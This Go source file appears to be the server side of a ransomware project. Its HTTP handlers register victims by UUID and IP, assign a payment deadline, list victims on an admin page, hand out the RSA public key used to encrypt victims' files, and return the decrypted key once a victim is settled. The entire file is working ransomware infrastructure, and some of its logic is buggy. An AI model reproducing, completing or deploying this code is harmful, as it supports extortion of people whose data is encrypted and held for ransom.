package handlers

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"text/template"
	"time"

	"github.com/nireo/gocry/server/database"
)

// DecryptKey takes in the user's encrypted key and removes the RSA encryption on the key.
func DecryptKey(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	id, ok := query["id"]
	if !ok || len(id) == 0 {
		http.Error(w, "to encrypt key, you need to provide a valid id", http.StatusBadRequest)
		return
	}

	key, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "error reading request body", http.StatusInternalServerError)
		return
	}

	pemd, err := ioutil.ReadFile("private.pem")
	if err != nil {
		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
		return
	}

	// decode the pem data
	block, _ := pem.Decode(pemd)
	if block == nil {
		http.Error(w, "error decoding key data", http.StatusInternalServerError)
		return
	}

	// check that the key is of the right type.
	if got, want := block.Type, "PRIVATE KEY"; got != want {
		http.Error(w, "unknown key type", http.StatusInternalServerError)
		return
	}

	// Decode the RSA private key
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		http.Error(w, "bad private key", http.StatusInternalServerError)
		return
	}

	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key-"+id[0]))
	if err != nil {
		http.Error(w, "error with rsa decrypting", http.StatusInternalServerError)
		return
	}

	db := database.GetDatabase()

	// since creating the decrypted key was successful we can delete the victim from the database
	var victim database.Victim
	if err := db.Where(&database.Victim{UUID: id[0]}).First(&victim).Error; err != nil {
		http.Error(w, "invalid uuid", http.StatusBadRequest)
		return
	}

	db.Delete(&victim)

	w.Write(out)
}

type newVictim struct {
	UUID      string `json:"uuid"`
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

// RegisterNewVictim creates a new victim from a json request
func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if r.Header.Get("Content-Type") != "application/json" {
		http.Error(w, fmt.Sprintf("wrong content type, wanted: application/json, got: %s",
			r.Header.Get("Content-Type")), http.StatusBadRequest)
		return
	}

	// parse json data from the request
	var victimData newVictim
	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
			http.StatusInternalServerError)
		return
	}

	// The uuid is created on the client-side, since then the client also easily knows
	// its own uuid.

	victim := &database.Victim{
		UUID:      victimData.UUID,
		Timestamp: victimData.Timestamp,
		IP:        victimData.IP,
		Completed: false,
	}

	tm := time.Unix(victim.Timestamp, 0)
	tm.Add(time.Hour * 24 * 2)
	victim.DueDate = tm.Unix()

	db := database.GetDatabase()
	db.Create(&victim)

	log.Printf("new victim registered, ID: %s, IP: %s", victim.UUID, victim.IP)
	w.WriteHeader(http.StatusOK)
}

type victimHtmlDisplay struct {
	Count   int
	Victims []database.Victim
}

// ServeVictimsDisplay returns a simple html page with all the victims and they information.
func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	db := database.GetDatabase()

	var victims []database.Victim
	db.Find(&victims)

	htmlDisplay := &victimHtmlDisplay{
		Count:   len(victims),
		Victims: victims,
	}

	tmpl := template.Must(template.ParseFiles("./templates/victims.html"))
	if err := tmpl.Execute(w, htmlDisplay); err != nil {
		http.Error(w, fmt.Sprintf("could not execute html template: %s", err), http.StatusInternalServerError)
		return
	}
}

// GetRSAPubKey returns the public key from the server
func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadFile("./public.pem")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not get rsa public key: %s", err),
			http.StatusInternalServerError)
	}

	w.Write(data)
}

// GetRansomwareDueDate takes the victim id and returns the due date for the payment
func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
	uuid := r.URL.Query().Get("id")
	if uuid != "" {
		http.Error(w, "no id query provided", http.StatusBadRequest)
		return
	}

	db := database.GetDatabase()

	var victim database.Victim
	if err := db.Where(&database.Victim{UUID: uuid}).First(&victim).Error; err != nil {
		http.Error(w, "victim data not found", http.StatusNotFound)
		return
	}

	tm := time.Unix(victim.DueDate, 0)
	w.Write([]byte(tm.String()))
}
